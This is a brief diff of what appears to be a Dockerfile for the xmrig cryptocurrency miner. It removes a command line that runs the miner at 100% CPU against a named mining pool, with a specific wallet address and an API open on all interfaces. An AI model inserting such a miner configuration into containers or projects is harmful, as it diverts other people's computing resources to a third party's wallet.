@@ -12,4 +12,3 @@ RUN make
 
 ENTRYPOINT ["./xmrig"]
 
-CMD ["--max-cpu-usage=100", "--url=bbc.uupool.cn:12812", "--user=19abmxh3v22vzzr694tv4kdhm98qxjz67g3hpvvfn1h5b31zq81aa4vb6", "--pass=Docker", "-k", "--algo=cn/bbc", "--http-host=0.0.0.0", "--http-port=8080"]˚
